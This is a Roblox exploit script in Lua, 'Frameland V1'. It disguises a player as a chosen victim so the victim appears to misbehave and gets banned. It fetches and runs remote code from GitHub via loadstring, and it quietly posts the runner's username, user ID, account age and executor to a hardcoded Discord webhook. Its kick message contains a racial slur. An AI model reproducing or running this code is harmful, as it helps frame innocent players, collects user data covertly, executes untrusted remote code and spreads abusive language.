getgenv().FRAMELAND = {
    SelfOptions = {
        Cash = 0, -- leave at 0 to disable
        SelfFrame = false, -- will frame yourself instead of different player
    },
    VictimOptions = {
        UID = 1, -- the guy whos getting banned's userID
        Target = "BiteysRevival",  -- the guy whos gonna be framing
        Emoji = "", -- ⭐ 🌟 ☑️ leave blank to disable
        HasHeadLess = true,
        HasKorblox = true,
    }
}

if FRAMELAND.SelfOptions.SelfFrame then 
    FRAMELAND.VictimOptions.Target = game.Players.LocalPlayer.Name
end

local BlacklistedIDS = loadstring(game:HttpGet("https://raw.githubusercontent.com/datadisruptor/FrameScript/main/blacklisted"))()
local BannedIDS = loadstring(game:HttpGet("https://raw.githubusercontent.com/datadisruptor/FrameScript/main/banned"))()

if table.find(BlacklistedIDS,FRAMELAND.VictimOptions.UID) then 
    game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = "UID Blacklisted",
        Text = "This user is blacklisted from being framed please try a different user.", 
    })
    return
end

if table.find(BannedIDS,game.Players.LocalPlayer.UserId) then 
    task.spawn(function()
        for i = 1,100 do 
            game.ReplicatedStorage.MainEvent:FireServer("OneMoreTime")
            wait()
        end
    end)
    game.Players.LocalPlayer:Kick("YOUR FUCKING BANNED NIGGAAAAA")
    return
end

task.spawn(function()
        local function dayCountConverter(n)
            local years = math.floor(n / 365)
            local months = math.floor((n - (years * 365)) / 30)
            local days = n - (years * 365) - (months * 30)
            return string.format("%i Years, %i Months, %i Days",years, months, days)
        end
        local OSTime = os.time()
        local Time = os.date("!*t", OSTime)
        local Content = ""
        local Embed = {
            ["title"] = "**Frameland V1**",
            ["type"] = "rich",
            ["color"] = tonumber(0x000000),
            ["fields"] = {
                {
                    ["name"] = "Name",
                    ["value"] = game.Players.LocalPlayer.Name,
                    ["inline"] = false
                },
                {
                    ["name"] = "DisplayName",
                    ["value"] = game.Players.LocalPlayer.DisplayName,
                    ["inline"] = false
                },
                {
                    ["name"] = "Exploit",
                    ["value"] = identifyexecutor(),
                    ["inline"] = false
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = dayCountConverter(game.Players.LocalPlayer.AccountAge),
                    ["inline"] = false
                },
                {
                    ["name"] = "User ID",
                    ["value"] = game.Players.LocalPlayer.UserId,
                    ["inline"] = false
                },
                {
                    ["name"] = "Game",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = false
                },
            },
            ["timestamp"] = string.format(
                "%d-%d-%dT%02d:%02d:%02dZ",
                Time.year,
                Time.month,
                Time.day,
                Time.hour,
                Time.min,
                Time.sec
            )
        }
        http_request({
            Url = "https://discord.com/api/webhooks/1183517812367564883/xdpObz7R95KYQD8e3s92d_djOJRBfhksQRn86S3qUqENo-zsqEIM7YVjxA3KFe38FsjI",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
        })
end)
formatNumber = (function (n)
    n = tostring(n)
    return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end)


function findtag(name) 
    for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Leaderboard.PlayerScroll:GetChildren()) do 
        if v:IsA("Frame") then 
            if v:WaitForChild("PlayerName").Text == name then 
                return v.PlayerName
            end
        end
    end
end
local decodedbackup 
function Morph(UserId,Name)
    local appearance = game.Players:GetCharacterAppearanceAsync(UserId)
    local player = game.Players:FindFirstChild(Name)
    for i,v in pairs(player.Character:GetChildren()) do
        if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("CharacterMesh") or v:IsA("BodyColors") then
            v:Destroy()
        end
    end
local friend = game.Players:FindFirstChild(FRAMELAND.VictimOptions.Target)
local UserData = game:HttpGet("https://users.roblox.com/v1/users/" .. FRAMELAND.VictimOptions.UID, true)
local decodedData = game:GetService("HttpService"):JSONDecode(UserData)
friend.UserId = decodedData.id
friend.DisplayName = decodedData.displayName
friend.Character.Name = decodedData.name
if FRAMELAND.VictimOptions.Emoji == "" then 
    friend.Character.Humanoid.DisplayName = decodedData.displayName
else
    friend.Character.Humanoid.DisplayName = "["..FRAMELAND.VictimOptions.Emoji.."]"..decodedData.displayName
end
decodedbackup = decodedData
findtag(friend.Name).Text = decodedData.name
     --[[for i, v in pairs(appearance:GetDescendants()) do
        if v:IsA("Animation") and FRAMELAND.CopyAnimations then
            local animationParent = game.Players[FRAMELAND.VictimOptions.Target].Character:FindFirstChild("Animate")
            if animationParent and animationParent:FindFirstChild(v.Parent.Name) then
                local animationObject = animationParent[v.Parent.Name]:FindFirstChild(v.Name)
                if animationObject and animationObject:IsA("Animation") then
                    animationObject.AnimationId = v.AnimationId
                end
            end
        end
    end]]
    if player.Character.Head:FindFirstChild("face") then
        player.Character.Head.face:Destroy()
    end
    for i,v in pairs(appearance:GetChildren()) do
        if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then
            v.Parent = player.Character
        elseif v:IsA("Accessory") then
            player.Character.Humanoid:AddAccessory(v)
        elseif v.Name == "R15" then
            if player.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
                v:FindFirstChildOfClass("CharacterMesh").Parent = player.Character
            end
        end
    end
    if appearance:FindFirstChild("face") then
        appearance.face.Parent = player.Character.Head
    else
        local face = Instance.new("Decal")
        face.Face = "Front"
        face.Name = "face"
        face.Texture = "rbxasset://textures/face.png"
        face.Transparency = 0
        face.Parent = player.Character.Head
    end
    local parent = player.Character.Parent
    player.Character.Parent = nil
    player.Character.Parent = parent
end

    if FRAMELAND.VictimOptions.HasHeadLess == true then
         game.Players[FRAMELAND.VictimOptions.Target].Character.Head.MeshId = 6686307858
    end
    if FRAMELAND.VictimOptions.HasKorblox == true then
        game.Players[FRAMELAND.VictimOptions.Target].Character.RightLowerLeg.MeshId = "902942093"
        game.Players[FRAMELAND.VictimOptions.Target].Character.RightLowerLeg.Transparency = "1"
        game.Players[FRAMELAND.VictimOptions.Target].Character.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
        game.Players[FRAMELAND.VictimOptions.Target].Character.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
        game.Players[FRAMELAND.VictimOptions.Target].Character.RightFoot.MeshId = "902942089"
        game.Players[FRAMELAND.VictimOptions.Target].Character.RightFoot.Transparency = "1"
    end
    Morph(FRAMELAND.VictimOptions.UID,FRAMELAND.VictimOptions.Target)
game.Players[FRAMELAND.VictimOptions.Target].Name = decodedbackup.name
if FRAMELAND.SelfOptions.Cash > 0 then 
    game.Players.LocalPlayer.PlayerGui.MainScreenGui.MoneyText.Text = "$"..formatNumber(FRAMELAND.SelfOptions.Cash)end
